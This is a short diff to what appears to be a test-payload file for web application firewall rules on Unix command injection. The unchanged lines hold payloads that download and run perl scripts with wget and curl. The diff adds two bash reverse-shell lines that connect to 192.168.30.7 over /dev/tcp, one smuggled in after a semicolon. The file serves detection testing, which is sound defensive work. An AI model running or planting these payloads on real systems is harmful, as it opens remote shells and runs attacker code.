@@ -486,6 +486,7 @@ blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg;wget http://example.co
 wget http://example.com/wp-content/uploads/2010/doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; rm -rf doc.*
 wget http://example.com/res.jpg;lwp-download http://example.com/res.jpg;fetch http://example.com/res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;rm -rf res.*
 curl -C - -O http://www.example.com/bot.txt;perl bot.txt;rm bot.txt
+;setsid /bin/bash -i >/dev/tcp/192.168.30.7/443 0<&1 2>&1
 
 # rule 932130: unix shell expressions, detected without keyword (false is not in the list)
 $(false)
@@ -664,3 +665,4 @@ echo RVSPSL>/tmp/RVSPSL.txt
 echo FYVZVP > /tmp/FYVZVP.txt
 cat /tmp/FYVZVP.txt
 perl doc.txt
+setsid /bin/bash -i >/dev/tcp/192.168.30.7/443 0<&1 2>&1
